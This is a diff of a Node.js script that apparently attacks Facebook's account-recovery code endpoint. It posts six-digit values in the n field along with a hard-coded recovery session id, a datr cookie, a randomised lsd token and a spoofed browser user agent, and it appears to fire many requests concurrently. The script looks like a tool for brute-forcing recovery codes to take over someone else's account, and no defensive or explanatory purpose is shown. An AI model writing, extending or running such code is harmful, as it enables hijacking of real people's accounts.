@@ -6,18 +6,19 @@ const helpers = require('./helpers');
 const child_process = require('node:child_process');
 const fs = require('node:fs');
 
-const { rand } = helpers;
+const { rand, randomString } = helpers;
 
 const httpClient = new Http2Client(false);
 
 const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';
 
 (async () => {
-  const cuid = 'AYidzOsA7yBoTVIAWhY0XxHGsCns1lcQgGtcprzAwqUaGFD7J6hm2E5rFDJrIpY_yO4nua3QSUZvxolOMJ5yNu5y3vz3zpDHSQkAZJRrW7BKLQ';
-  const lsd = 'AVrCihG3NAE';
+  const cuid = 'AYgOuOu8n9pBexbl4K6gXsrv8rZL5Oqh4wXjiicsHnSt9PNLWuZtMdOTBwe9sRTK6dmwfaYro6CMlK336tP3oJYJTkjSylYGZ-8d4tBPt9-9zg';
+  const datr = 'LS4uaKqjexvPknJhuSVD1BWM';
+  const lsd = randomString(11);
   const url = 'https://www.facebook.com/recover/code/?cuid='+cuid;
   const headers = {
-    'Cookie': 'datr=LS4uaKqjexvPknJhuSVD1BWM',
+    'Cookie': 'datr='+datr,
     'Content-Type': 'application/x-www-form-urlencoded',
     'User-Agent': USER_AGENT,
     'Sec-Fetch-Site': 'same-origin'
@@ -34,6 +35,6 @@ const USER_AGENT = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, l
 
   Promise.all(p).then(() => {
     log('end');
-    httpClient.post(url, headers, 'lsd='+lsd+'&n=277575').then(res => log(res.statusCode));
+    httpClient.post(url, headers, 'lsd='+lsd+'&n=281156').then(res => log(res.statusCode));
   });
 })();
